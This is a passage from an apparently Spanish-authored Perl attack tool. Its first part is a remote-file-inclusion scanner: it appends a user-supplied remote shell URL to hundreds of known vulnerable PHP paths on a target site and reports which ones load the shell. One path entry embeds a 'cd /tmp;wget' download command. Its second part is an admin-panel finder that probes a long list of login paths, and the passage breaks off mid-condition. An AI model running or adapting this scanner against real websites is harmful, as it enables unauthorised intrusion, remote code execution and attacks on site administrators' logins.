'sources/join.php?CONFIG[path]=','topsites/sources/join.php?CONFIG[path]=','toplist/sources/join.php?CONFIG[path]=',
'topsite/sources/join.php?CONFIG[path]=','public_includes/pub_popup/popup_finduser.php?vsDragonRootPath=',
'extras/poll/poll.php?file_newsportal=','index.php?site_path=','mail/index.php?site_path=','fclick/show.php?path=',
'show.php?path=','calogic/reconfig.php?GLOBALS[CLPath]=','eshow.php?Config_rootdir=',
'auction/auction_common.php?phpbb_root_path=','index.php?inc_dir=','calendar/index.php?inc_dir=',
'modules/TotalCalendar/index.php?inc_dir=','modules/calendar/index.php?inc_dir=','calendar/embed/day.php?path=',
'ACalendar/embed/day.php?path=','calendar/add_event.php?inc_dir=',
'claroline/auth/extauth/drivers/ldap.inc.php?clarolineRepositorySys=',
'claroline/auth/ldap/authldap.php?includePath=','docebo/modules/credits/help.php?lang=',
'modules/credits/help.php?lang=','config.php?returnpath=','editsite.php?returnpath=','in.php?returnpath=',
'addsite.php?returnpath=','includes/pafiledb_constants.php?module_root_path='
,'phpBB/includes/pafiledb_constants.php?module_root_path=',
'pafiledb/includes/pafiledb_constants.php?module_root_path=','auth/auth.php?phpbb_root_path=',
'auth/auth_phpbb/phpbb_root_path=','apc-aa/cron.php3?GLOBALS[AA_INC_PATH]=',
'apc-aa/cached.php3?GLOBALS[AA_INC_PATH]=',
'infusions/last_seen_users_panel/last_seen_users_panel.php?settings[locale]=',
'phpdig/includes/config.php?relative_script_path=','includes/phpdig/includes/config.php?relative_script_path=',
'includes/dbal.php?eqdkp_root_path=','eqdkp/includes/dbal.php?eqdkp_root_path=',
'dkp/includes/dbal.php?eqdkp_root_path=',
'path/include/SQuery/gameSpy2.php?libpath=','include/global.php?GLOBALS[includeBit]=','topsites/config.php?returnpath=',
'manager/frontinc/prepend.php?_PX_config[manager_path]=','ubbthreads/addpost_newpoll.php?addpoll=thispath=',
'forum/addpost_newpoll.php?thispath=','forums/addpost_newpoll.php?thispath=','ubbthreads/ubbt.inc.php?thispath=',
'forums/ubbt.inc.php?thispath=','forum/ubbt.inc.php?thispath=','forum/admin/addentry.php?phpbb_root_path=',
'admin/addentry.php?phpbb_root_path=','index.php?f=','index.php?act=','ipchat.php?root_path=',
'includes/orderSuccess.inc.php?glob[rootDir]=','stats.php?dir[func]=dir[base]=','ladder/stats.php?dir[base]=',
'ladders/stats.php?dir[base]=','sphider/admin/configset.php?settings_dir=','admin/configset.php?settings_dir=',
'vwar/admin/admin.php?vwar_root=','modules/vwar/admin/admin.php?vwar_root=',
'modules/vWar_Account/includes/get_header.php?vwar_root=',
'modules/vWar_Account/includes/functions_common.php?vwar_root2=','sphider/admin/configset.php?settings_dir=',
'admin/configset.php?settings_dir=','impex/ImpExData.php?systempath=','forum/impex/ImpExData.php?systempath=',
'forums/impex/ImpExData.php?systempath=','application.php?base_path=','index.php?theme_path=',
'become_editor.php?theme_path=','add.php?theme_path=','bad_link.php?theme_path=','browse.php?theme_path=',
'detail.php?theme_path=','fav.php?theme_path=','get_rated.php?theme_path=','login.php?theme_path=',
'mailing_list.php?theme_path=','new.php?theme_path=','modify.php?theme_path=','pick.php?theme_path=',
'power_search.php?theme_path=','rating.php?theme_path=','register.php?theme_path=',
'review.php?theme_path=','rss.php?theme_path=','search.php?theme_path=','send_pwd.php?theme_path=',
'sendmail.php?theme_path=','tell_friend.php?theme_path=','top_rated.php?theme_path=',
'user_detail.php?theme_path=','user_search.php?theme_path=','invoice.php?base_path=',
'cgi-bin//classes/adodbt/sql.php?classes_dir=','cgi-bin/install/index.php?G_PATH=',
'cgi-bin/include/print_category.php?dir=','includes/class_template.php?quezza_root_path=',
'bazar/classified_right.php?language_dir=','classified_right.php?language_dir=',
'phpBazar/classified_right.php?language_dir=','chat/messagesL.php3?cmd=',
'phpMyChat/chat/messagesL.php3?cmd=','bbs/include/write.php?dir=',
'visitorupload.php?cmd=','modules/center/admin/accounts/process.php?module_path]=',
'index.php?template=','armygame.php?libpath=','lire.php?rub=',
'pathofhostadmin/?page=','apa_phpinclude.inc.php?apa_module_basedir=',
'index.php?req_path=','research/boards/encapsbb-0.3.2_fixed/index_header.php?root=',
'Farsi1/index.php?archive=','index.php?archive=','show_archives.php?template=',
'forum/include/common.php?pun_root=','pmwiki wiki/pmwiki-2.1.beta20/pmwiki.php?GLOBALS[FarmD]=',
'vuln.php?=','cgi-bin//include/write.php?dir=','admin/common.inc.php?basepath=',
'pm/lib.inc.php?sfx=','pm/lib.inc.php?pm_path=','artmedic-kleinanzeigen-path/index.php?id=',
'index.php?pagina=','osticket/include/main.php?include_dir=',
'include/main.php?config[search_disp]=include_dir=','phpcoin/config.php?_CCFG[_PKG_PATH_DBSE]=',
'quick_reply.php?phpbb_root_path=','zboard/include/write.php?dir=',
'PATH/admin/plog-admin-functions.php?configbasedir=',
'path_to_phpgreetz/content.php?content=','path_to_qnews/q-news.php?id=',
'_conf/core/common-tpl-vars.php?confdir=','votebox.php?VoteBoxPath=',
'al_initialize.php?alpath=','include/db.php?GLOBALS[rootdp]=',
'modules/news/archivednews.php?GLOBALS[language_home]=',
'protection.php?siteurl=','modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]=',
'index2.php?includes_dir=','classes.php?LOCAL_PATH=',
'extensions/moblog/moblog_lib.php?basedir=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=',
'phpWebLog/include/init.inc.php?G_PATH=','admin/objects.inc.php4?Server=',
'trg_news30/trgnews/install/article.php?dir=','block.php?Include=','arpuivo.php?data=',
'path_to_gallery/setup/index.php?GALLERY_BASEDIR=','include/help.php?base=',
'index.php?[Home]=','path_to_script/block.php?Include=','examples/phonebook.php?page=',
'PHPNews/auth.php?path=','include/print_category.php?dir=','skin/zero_vote/login.php?dir=',
'skin/zero_vote/setup.php?dir=','skin/zero_vote/ask_password.php?dir=',
'gui/include/sql.php?include_path=',
'webmail/lib/emailreader_execute_on_each_page.inc.php?emailreader_ini=',
'email.php?login=cer_skin=','PhotoGal/ops/gals.php?news_file=',
'index.php?custom=',
'loginout.php?cutepath=','oneadmin/config.php?path[docroot]=',
'xcomic/initialize.php?xcomicRootPath=',
'skin/zero_vote/setup.php?dir=','skin/zero_vote/error.php? dir=',
'admin_modules/admin_module_captions.inc.php?config[path_src_include]=',
'admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=',
'admin_modules/admin_module_edit.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_deldir.inc.php?config[path_src_include]=',
'src/index_overview.inc.php?config[path_src_include]=',
'src/index_leftnavbar.inc.php?config[path_src_include]=',
'src/index_image.inc.php?config[path_src_include]=',
'src/image-gd.class.php?config[path_src_include]=',
'src/image.class.php?config[path_src_include]=','src/album.class.php?config[path_src_include]=',
'src/show_random.inc.php?config[path_src_include]=',
'src/main.inc.php?config[path_src_include]=',
'src/index_passwd-admin.inc.php?config[path_admin_include]=',
'yappa-ng/src/index_overview.inc.php?config[path_src_include]=',
'admin_modules/admin_module_captions.inc.php?config[path_src_include]=',
'admin_modules/admin_module_rotimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delcomments.inc.php?config[path_src_include]=',
'admin_modules/admin_module_edit.inc.php?config[path_src_include]=',
'admin_modules/admin_module_delimage.inc.php?config[path_src_include]=',
'admin_modules/admin_module_deldir.inc.php?config[path_src_include]=',
'src/index_overview.inc.php?config[path_src_include]=','src/image-gd.class.php?config[path_src_include]=',
'src/image.class.php?config[image_module]=','src/album.class.php?config[path_src_include]=',
'src/show_random.inc.php?config[path_src_include]=','src/main.inc.php?config[path_src_include]=',
'includes/db_adodb.php?baseDir=','includes/db_connect.php?baseDir=','includes/session.php?baseDir=',
'modules/projects/gantt.php?dPconfig[root_dir]=','modules/projects/gantt2.php?dPconfig[root_dir]=',
'modules/projects/vw_files.php?dPconfig[root_dir]=','modules/admin/vw_usr_roles.php?baseDir=',
'modules/public/calendar.php?baseDir=','modules/public/date_format.php?baseDir=',
'modules/tasks/gantt.php?baseDir=','mantis/login_page.php?g_meta_include_file=',
'phpgedview/help_text_vars.php?PGV_BASE_DIRECTORY=',
'modules/My_eGallery/public/displayCategory.php?basepath=',
'dotproject/modules/files/index_table.php?root_dir=','nukebrowser.php?filnavn=',
'bug_sponsorship_list_view_inc.php?t_core_path=','modules/coppermine/themes/coppercop/theme.php?THEME_DIR=',
'modules/coppermine/themes/maze/theme.php?THEME_DIR=',
'modules/coppermine/include/init.inc.php?CPG_M_DIR=',
'includes/calendar.php?phpc_root_path=','includes/setup.php?phpc_root_path=',
'phpBB/admin/admin_styles.php?mode=','aMember/plugins/db/mysql/mysql.inc.php?config=',
'admin/lang.php?CMS_ADMIN_PAGE=','inc/pipe.php?HCL_path=',
'include/write.php?dir=','becommunity/community/index.php?pageurl=',
'modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/mod_mainmenu.php?mosConfig_absolute_path=',
'modules/agendax/addevent.inc.php?agendax_path=','shoutbox/expanded.php?conf=',
'modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'index.php?page=','index.php?pag=','index.php?include=','index.php?content=',
'index.php?cont=','index.php?c=','modules/My_eGallery/index.php?basepath=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath=','journal.php?m=',
'index.php?m=','links.php?c=','forums.php?m=','list.php?c=','user.php?xoops_redirect=',
'index.php?id=','r.php?url=','CubeCart/includes/orderSuccess.inc.php?&glob[rootDir]=',
'inc/formmail.inc.php?script_root=','include/init.inc.php?G_PATH=',
'backend/addons/links/index.php?PATH=','modules/newbb_plus/class/class.forumposts.php?bbPath[path]=',
'modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]=','protection.php?siteurl=',
'htmltonuke.php?filnavn=','mail_autocheck.php?pm_path=','index.php?p=',
'modules/4nAlbum/public/displayCategory.php?basepath=','e107/e107_handlers/secure_img_render.php?p=',
'include/new-visitor.inc.php?lvc_include_dir=','path_of_cpcommerce/_functions.php?prefix=',
'community/modules/agendax/addevent.inc.php?agendax_path=','library/editor/editor.php?root=',
'library/lib.php?root=','zentrack/index.php?configFile=','pivot/modules/module_db.php?pivot_path=',
'main.php?x=','myPHPCalendar/admin.php?cal_dir=','index.php/main.php?x=',
'index.php?x=','index.php?open=','index.php?visualizar=',
'template.php?pagina=','index.php?inc=','includes/include_onde.php?include_file=',
'index.php?pg=','index.php?show=','index.php?cat=','print.php?val1=',
'cmd.php?function=','iframe.php?file=','os/pointer.php?url=',
'p_uppc_francais/pages_php/p_aidcon_conseils/index.php?FM=',
'index.php?file=','db.php?path_local=','phpGedView/individual.php?PGV_BASE_DIRECTORY=',
'index.php?kietu[url_hit]=','phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=',
'Sources/Packages.php?sourcedir=','yabbse/Sources/Packages.php?sourcedir=',
'modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=',
'cgi-bin//gadgets/Blog/BlogModel.php?path=','cgi-bin//admin.php?cal_dir=',
'gallery/captionator.php?GALLERY_BASEDIR=','cgi-bin/main.php?x=',
'Blog/BlogModel.php?path=','admin.php?cal_dir=','expanded.php?conf=',
'mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=','pollvote/pollvote.php?pollname=',
'displayCategory.php?basepath=','phpBB2/admin/admin_cash.php?phpbb_root_path=',
'modules/foro/includes/functions_admin.php?phpbb_root_path=',
'modules/Forums/admin/admin_forums.php?phpEx=','modules/Forums/admin/admin_disallow.php?phpEx=',
'modules/Forums/admin/admin_smilies.php?phpEx=','modules/Forums/admin/admin_board.php?phpEx=',
'modules/Forums/admin/admin_users.php?phpEx=','modules/Forums/admin/admin_mass_email.php?phpEx=',
'modules/Forums/admin/admin_forum_prune.php?phpEx=',
'modules/Forums/admin/admin_styles.php?phpbb_root_path=',
'index.php?hc=','mt-comments.cgi?id=','webcalendar/tools/send_reminders.php?includedir=',
'cmd/product_info.php/products_id/1622/shop_content.php?coID=','addevent.inc.php?agendax_path=',
'step_one.php?server_inc=','upgrade_album.php?GALLERY_BASEDIR=','search.php?cutepath=',
'modules.php?name=','wagora/extras//quicklist.php?site=','vCard/admin/define.inc.php?match=',
'forum/ubbthreads.php?Cat=','admin/includes/classes/spaw/spaw_control.class.php?spaw_root=',
'secure.php?cfgProgDir=','modules/My_eGallery/public//inc/?HCL_path=',
'modules/My_eGallery/public/imagen.php?basepath=',
'adlayer.php?layerstyle=','Forums/bb_smilies.php?name=','modules/Forums/bb_smilies.php?name=',
'gadgets/Blog/BlogModel.php?path=','learnlinc/clmcpreload.php?CLPATH=','modernbill/samples/news.php?DIR=',
'religions/faq.php?page=','forum/viewtopic.php?t=','announcements.php?includePath=',
'inc/header.php/step_one.php?server_inc=','phpatm/index.php?include_location=',
'gb/form.inc.php3?lang=','shannen/index.php?x=','family/phpgedview/index.php?PGV_BASE_DIRECTORY=',
'main.php?left=','forum/misc.php?action=','nucleus/libs/globalfunctions.php?DIR_LIBS=',
'show_archives.php?cutepath=','gallery.php=','magicforum/misc.php?action=',
'forum/admin/actions/del.php?include_path=','index.php?meio=','local/investing_industrialeastate1.php?a=',
'modules/coppermine/themes/default/theme.php?THEME_DIR','Popper/index.php?childwindow.inc.php?form=',
'class.mysql.php?path_to_bt_dir=','include/footer.inc.php?_AMLconfig[cfg_serverpath]=',
'eyeos/desktop.php?baccio=',
'ashnews.php?pathtoashnews=','index.php?modpath=','becommunity/community/index.php?pageurl=',
'index.php?sqld=','modules/module_db.php?pivot_path=','catalog/includes/include_once.php?include_file=',
'cgi-bin/calendar.pl?fromTemplate=','live/inc/pipe.php?HCL_path=',
'zb41/include/write.php?dir=','cgi-bin/awstats.pl?logfile=','presse/stampa.php3?azione=',
'inc/step_one_tables.php?server_inc=','index.php?mainpage=','phpprojekt/lib/authform.inc.php?path_pre=',
'captionator.php?GALLERY_BASEDIR=','_head.php?_zb_path=.example.com',
'achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=',
'gallery/captionator.php?GALLERY_BASEDIR=.example.com','globals.php3?LangCookie=.example.com',
'include/msql.php?inc_dir=','include/mssql7.php?inc_dir=','include/mysql.php?inc_dir=',
'include/oci8.php?inc_dir=','include/postgres.php?inc_dir=',
'include/postgres65.php?inc_dir=','install.php?phpbb_root_dir=',
'mantis/login_page.php?g_meta_inc_dir=','page.php?template=',
'phorum/admin/actions/del.php?include_path=','pollensondage.inc.php?app_path=',
'user/agora_user.php?inc_dir=','user/ldap_example.php?inc_dir=',
'userlist.php?ME=.example.com','_functions.php?prefix=',
'cpcommerce/_functions.php?prefix=','ashnews.php?pathtoashnews=cd /tmp;wget',
'eblog/blog.inc.php?xoopsConfig[xoops_url]=','b2-tools/gm-2-b2.php?b2inc=',
'includes/include_once.php?include_file=','modules.php?name=jokeid=',
'index.php?site=','livehelp/inc/pipe.php?HCL_path=',
'hcl/inc/pipe.php?HCL_path=','support/faq/inc/pipe.php?HCL_path=',
'help/faq/inc/pipe.php?HCL_path=','helpcenter/inc/pipe.php?HCL_path=',
'live-support/inc/pipe.php?HCL_path=','gnu3/index.php?doc=',
'gnu/index.php?doc=','phpgwapi/setup/tables_update.inc.php?appdir=',
'includes/calendar.php?phpc_root_path=','includes/setup.php?phpc_root_path=',
'inc/authform.inc.php?path_pre=','include/authform.inc.php?path_pre=',
'web_statistics/modules/coppermine/themes/default/theme.php?THEME_DIR=',
'web_statistics//tools/send_reminders.php?includedir=',
'web_statistics//include/write.php?dir=',
'web_statistics//modules/My_eGallery/public/displayCategory.php?basepath=',
'web_statistics//calendar/tools/send_reminders.php?includedir=',
'web_statistics//skin/zero_vote/error.php?dir=',
'web_statistics//coppercop/theme.php?THEME_DIR=',
'includes/header.php?systempath=','Gallery/displayCategory.php?basepath=',
'index.inc.php?PATH_Includes=','nphp/nphpd.php?nphp_config[LangFile]=',
'ashheadlines.php?pathtoashnews=','demo/includes/init.php?user_inc=',
'jaf/index.php?show=','inc/shows.inc.php?cutepath=','poll/admin/common.inc.php?base_path=',
'sources/post.php?fil_config=','bb_lib/checkdb.inc.php?libpach=',
'include/livre_include.php?chem_absolu=','index.php?pageurl=',
'derniers_commentaires.php?rep=','modules/coppermine/themes/default/theme.php?THEME_DIR=',
'coppermine/themes/maze/theme.php?THEME_DIR=','allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]=',
'allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]=',
'agendax/addevent.inc.php?agendax_path=','main.php?page=','default.php?page=',
'index.php?action=','index1.php?p=','index2.php?x=','index2.php?content=',
'index.php?conteudo=','GradeMap/index.php?page=','phpopenchat/contrib/yabbse/poc.php?sourcedir=',
'calendar/calendar.php?serverPath=','calendar/functions/popup.php?serverPath=',
'calendar/events/header.inc.php?serverPath=','calendar/events/datePicker.php?serverPath=',
'calendar/setup/setupSQL.php?serverPath=','calendar/setup/header.inc.php?serverPath=',
'install/index.php?G_PATH=','support/mailling/maillist/inc/initdb.php?absolute_path=',
'coppercop/theme.php?THEME_DIR=','dotproject/modules/projects/addedit.php?root_dir=',
'dotproject/modules/projects/view.php?root_dir=','dotproject/modules/projects/vw_files.php?root_dir=',
'dotproject/modules/tasks/addedit.php?root_dir=',
'dotproject/modules/tasks/viewgantt.php?root_dir=',
'My_eGallery/public/displayCategory.php?basepath=',
'index.php?meio.php=','index.php?configFile=','index.php?do=',
'phpshop/index.php?base_dir=','contacts.php?cal_dir=',
'convert-date.php?cal_dir=','album_portal.php?phpbb_root_path=',
'mainfile.php?MAIN_PATH=','html/affich.php?base=',
'gallery/init.php?HTTP_POST_VARS=','ideabox/include.php?gorumDir=',
'stats/modules/My_eGallery/index.php?basepath=',
'stats/include/write.php?dir=','stats/tools/send_reminders.php?includedir=',
'index.cgiupgrade_album.php?GALLERY_BASEDIR=',
'pollvote/pollvote.php?pollname','includes/page_header.php?dir=',
'index2.php?mosConfig_absolute_path=','new/bbs//include/write.php?dir=',
'index.php?mosConfig_absolute_path=','modules/My_eGallery/public/inc/?HCL_path=',
'forum/auth/auth.php?phpbb_root_path=','forum/auth/auth_phpbb/phpbb_root_path=',
'cutenews/comments.php?cutepath=','library/lib.php?root=',
'impex/ImpExData.php?systempath=','coppermine/thumbnails.php?lang=',
'gallery/thumbnails.php?lang=','aWebNews/visview.php?path_to_news=',
'ashnews.php?pathtoashnews=','4images/index.php?template=',
'galeri/index.php?template=',
'components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=',
'components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=',
'components/com_smf/smf.php?mosConfig_absolute_path=',
'components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=',
'components/com_simpleboard/image_upload.php?sbp=',
'gallery/index.php?template=','auth/auth.php?phpbb_root_path=',
'auth/auth_phpbb/phpbb_root_path=','modules/Forums/admin/index.php?phpbb_root_path=',
'modules/Forums/admin/admin_avatar.php?phpbb_root_path=',
'modules/Forums/admin/admin_styles.php?phpbb_root_path=',
'_wk/wk_lang.php?wkPath=','shoutbox/expanded.php?conf=',
'myPHPCalendar/admin.php?cal_dir=','phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=',
'modules/Forums/admin/admin_board.php?phpEx=',
'modules/Forums/admin/admin_users.php?phpEx=',
'library/editor/editor.php?root=','library/lib.php?root=',
'e107/e107_handlers/secure_img_render.php?p=',
'modules/My_eGallery/public/displayCategory.php?basepath=',
'modules/My_eGallery/index.php?basepath=',
'modules/coppermine/themes/default/theme.php?THEME_DIR=',
'modules/4nAlbum/public/displayCategory.php?basepath=',
'modules/coppermine/themes/coppercop/theme.php?THEME_DIR=',
'modules/coppermine/themes/maze/theme.php?THEME_DIR=',
'modules/coppermine/include/init.inc.php?CPG_M_DIR=',
'phpBB/admin/admin_styles.php?mode=',
'modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR=',
'modules/xgallery/upgrade_album.php?GALLERY_BASEDIR=',
'index.php?page=','index.php?pag=','index.php?sayfa=',
'index.php?pg=','index.php?include=','index.php?content=',
'index.php?p=','index.php?s=','index.php?cont=','index.php?c=',
'journal.php?m=','index.php?m=','links.php?c=','forums.php?m=',
'list.php?c=','journal.php?m=','user.php?xoops_redirect=',
'index.php?id='
); }

#Cargamos los Paths uno por uno con foreach
foreach $rfi(@paths){

#final sera = a la web junto con el path
$final = $web."/".$rfi.$shell;
chop($final);

#declaramos variables para esperar una respuesta de la web
$request = HTTP::Request->new(GET=>$final);
$useragent = LWP::UserAgent->new();

#Con esto Pasamos la web con path por path esperando respuesta
$respuesta = $useragent->request($request);

#declaramos variables para esperar una respuesta de la web
if ($respuesta->is_success && $respuesta->content =~ /shell/)

#sera vulnerable la web
{ $msg = " * Vulnerable"; 
print ("[$msg]..........$final\n")
}


#de lo contrario
else 
{ $msg = " * No Encontrado\n";
}
chop($msg);

if ($proseso =~ /s|S/) 
 
{  #mostrara el mensage junto con el path
print ("[$msg]..........$final\n"); }


 }  } 


if ($opciones =~ /p/|/p/) {
##################Scanner RFI#######################
system("cls");
system("clear");
# Panel Finder
print q (

-------	------------------------------------------
.-..-. _       .----.       .---.  _          .-.           
: :: ::_;      `--  ;       : .--':_;         : :           
: :: :.-..---.  .' ' .--.   : `;  .-.,-.,-. .-' : .--. .--. 
: `' ;: :: .; ` _`,`.: ..'  : :   : :: ,. :' .; :' '_.': ..'
 `.,' :_;: ._.'`.__.':_;    :_;   :_;:_;:_;`.__.'`.__.':_;  
         : :                                                
         :_;                                                
-------	------------------------------------------


Inserta la web a escanear...	(http://web.com)

);

if ($web1 !~ /http/)
{
$web="http://".$web1; 
} else { $web=$web1; }

print("\n * Analizando la Pagina... \n   ".$web,"\n");

@paths=('
admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html',
'admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.cfm','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.cfm','admin/controlpanel.cfm','admin.cfm','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm','admin/cp.cfm','cp.cfm',
'administrator/account.cfm','administrator.cfm','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm','administrator/login.cfm',
'moderator/admin.cfm','controlpanel.cfm','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.cfm','user.html','admincp/index.cfm','admincp/login.cfm','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.cfm','admin/account.cfm','adminpanel.cfm','webadmin.cfm','webadmin/index.cfm',
'webadmin/admin.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm','panel-administracion/login.cfm','adminLogin.cfm',
'admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm','adminarea/admin.cfm','adminarea/login.cfm','admin-login.html',
'panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm','modelsearch/admin.cfm','administrator/index.cfm',
'admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','adm/index.cfm',
'adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html',
'admin/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html',
'admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php'
);
#cargamos todos los Paneles con foreach
foreach $finder( @paths) {


 $agente = LWP::UserAgent->new();
 $panelfinder = $agente->get($web."/".$finder);

 if ($panelfinder->content =~ /username/ || 
  $panelfinder->content =~ /Username/ || 
  $panelfinder->content =~ /UserName/ ||
  $panelfinder->content =~ /usuario/ || 
  $panelfinder->content =~ /Usuario/ ||
  $panelfinder->content =~ /user/ || 
  $panelfinder->content =~ /User/ ||
  $panelfinder->content =~ /password/ || 
  $panelfinder->content =~ /Password/ ||
  $panelfinder->content =~ /contraseÃ±a/ || 
  $panelfinder->content =~ /ContraseÃ±a/ ||
  $panelfinder->content =~ /senha/ || 
